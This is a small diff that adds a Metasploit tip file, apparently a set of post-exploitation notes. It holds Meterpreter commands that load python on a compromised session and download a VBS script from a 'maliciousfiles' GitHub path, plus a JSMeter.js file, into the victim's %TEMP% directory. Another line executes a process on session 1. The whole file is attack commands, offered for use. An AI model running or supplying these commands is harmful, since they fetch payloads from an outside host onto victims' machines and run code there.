@@ -1,1 +1,4 @@
-
+# listed are some more uncommon things you can do from Metasploit
+# load the python module, execute system commands to download files
+load python; python_execute "import urllib; t=urllib.URLopener(); t.retrieve('https://raw.githubusercontent.com/subinacls/Bash-Full/master/maliciousfiles/eVilBS/invisi.vbs','%TEMP%\\inv.vbs');t.retrieve('https://raw.githubusercontent.com/subinacls/JSMeter/master/JSMeter.js','%TEMP%\\jsmeter.js');"
+sessions -i 1 -C 'load python; python_execute "import os; os.popen(\"notepad\")"'
